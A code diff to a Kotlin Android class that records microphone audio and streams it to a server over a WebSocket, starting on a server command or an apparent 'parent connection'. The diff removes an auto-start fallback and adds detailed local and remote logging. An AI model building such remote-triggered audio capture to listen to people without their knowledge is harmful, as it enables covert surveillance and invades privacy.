@@ -169,36 +169,33 @@ class AudioStreamRecorder(
             }
         )
 
-        Log.d(TAG, "WebSocket initialized - waiting for server command to start recording...")
+        Log.d(TAG, "✅ AudioStreamRecorder setup complete - waiting for server command or parent connection")
         RemoteLogger.info(
             serverUrl = this.serverUrl,
             deviceId = this.deviceId,
             source = TAG,
-            message = "WebSocket initialized; waiting for START command"
+            message = "AudioStreamRecorder setup complete; waiting for trigger"
         )
-
-        // Fallback: ensure recording starts even if the START command is delayed.
-        streamScope.launch {
-            delay(300)
-            if (!isRecording) {
-                Log.d(TAG, "Auto-start fallback triggered after WebSocket init")
-                RemoteLogger.warn(
-                    serverUrl = serverUrl,
-                    deviceId = deviceId,
-                    source = TAG,
-                    message = "Auto-start fallback triggered"
-                )
-                startActualRecording()
-            }
-        }
     }
 
     /**
      * Actually start recording (called when command received from server)
      */
     private fun startActualRecording() {
+        Log.d(TAG, "🎤 startActualRecording() called - checking conditions...")
+        RemoteLogger.info(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            source = TAG,
+            message = "startActualRecording() called",
+            meta = mapOf(
+                "isRecording" to isRecording,
+                "webSocketConnected" to webSocketConnected
+            )
+        )
+
         if (isRecording) {
-            Log.w(TAG, "Already recording!")
+            Log.w(TAG, "⚠️ Already recording - skipping!")
             RemoteLogger.warn(
                 serverUrl = serverUrl,
                 deviceId = deviceId,
@@ -208,26 +205,57 @@ class AudioStreamRecorder(
             return
         }
 
-        Log.d(TAG, "Starting actual audio recording...")
+        Log.d(TAG, "🎙️ Starting actual audio recording...")
         RemoteLogger.info(
             serverUrl = serverUrl,
             deviceId = deviceId,
             source = TAG,
-            message = "Starting actual audio recording"
+            message = "STARTING ACTUAL AUDIO RECORDING NOW"
         )
 
         // Initialize AudioRecord
         initializeAudioRecord()
 
+        if (audioRecord == null || audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
+            Log.e(TAG, "❌ AudioRecord not initialized - cannot start recording!")
+            RemoteLogger.error(
+                serverUrl = serverUrl,
+                deviceId = deviceId,
+                source = TAG,
+                message = "AudioRecord not initialized - aborting recording"
+            )
+            return
+        }
+
         isRecording = true
+        Log.d(TAG, "✅ isRecording set to TRUE - launching recording coroutine...")
+        RemoteLogger.info(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            source = TAG,
+            message = "Launching recording coroutine"
+        )
+
         recordingJob = streamScope.launch {
             try {
+                Log.d(TAG, "📡 Recording coroutine started - entering loop...")
+                var chunkCount = 0
                 while (isRecording) {
                     recordAndSendChunk()
-                    // No delay needed - send immediately after recording
+                    chunkCount++
+                    if (chunkCount == 1) {
+                        Log.d(TAG, "✅ First chunk recorded and sent!")
+                        RemoteLogger.info(
+                            serverUrl = serverUrl,
+                            deviceId = deviceId,
+                            source = TAG,
+                            message = "First audio chunk processed"
+                        )
+                    }
                 }
+                Log.d(TAG, "🛑 Recording loop exited - total chunks: $chunkCount")
             } catch (e: Exception) {
-                Log.e(TAG, "Streaming error", e)
+                Log.e(TAG, "❌ Streaming error in coroutine", e)
                 RemoteLogger.error(
                     serverUrl = serverUrl,
                     deviceId = deviceId,
@@ -238,6 +266,8 @@ class AudioStreamRecorder(
                 stopStreaming()
             }
         }
+
+        Log.d(TAG, "✅ Recording job launched successfully")
     }
 
     /**
